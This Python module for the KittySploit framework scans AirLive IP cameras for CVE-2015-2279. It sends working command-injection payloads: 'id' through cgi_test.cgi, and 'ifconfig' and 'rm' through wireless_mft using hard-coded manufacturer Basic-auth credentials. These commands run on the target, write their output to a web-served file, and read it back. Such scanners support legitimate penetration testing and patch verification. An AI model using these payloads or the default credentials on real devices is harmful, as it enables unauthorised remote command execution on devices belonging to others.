#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AirLive Boa cgi_test.cgi OS command injection (CVE-2015-2279)."""

import base64
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AirLive - cgi_test.cgi RCE Detection (CVE-2015-2279)',
        'description': (
            'Detects AirLive OS command injection via /cgi_test.cgi?write_tan&;id&id '
            '(MD/BU models) or manufacture Basic-auth wireless_mft (WL/POE models).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'airlive', 'iot', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2279',
        ],
        'cve': 'CVE-2015-2279',
    }

    def run(self):
        path = '/cgi_test.cgi?write_tan&;id&id'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='AirLive cgi_test.cgi RCE (CVE-2015-2279)',
                path='/cgi_test.cgi',
            )
            return True

        token = self.random_text(8)
        auth = 'Basic ' + base64.b64encode(b'manufacture:erutcafunam').decode()
        inj = f'/cgi-bin/mft/wireless_mft?ap=testname;/sbin/ifconfig%202>%261%20>%20/web/html/{token}'
        self.http_request(
            method='GET', path=inj, headers={'Authorization': auth}, allow_redirects=False,
        )
        g = self.http_request(
            method='GET', path=f'/{token}', headers={'Authorization': auth}, allow_redirects=False,
        )
        if g and 'eth0' in (g.text or '') and 'Link encap' in (g.text or '') and 'HWaddr' in (g.text or ''):
            self.http_request(
                method='GET',
                path=f'/cgi-bin/mft/wireless_mft?ap=testname;rm%20/web/html/{token}',
                headers={'Authorization': auth},
                allow_redirects=False,
            )
            self.set_info(
                severity='critical',
                reason='AirLive wireless_mft RCE (CVE-2015-2279)',
                path='/cgi-bin/mft/wireless_mft',
            )
            return True
        return False
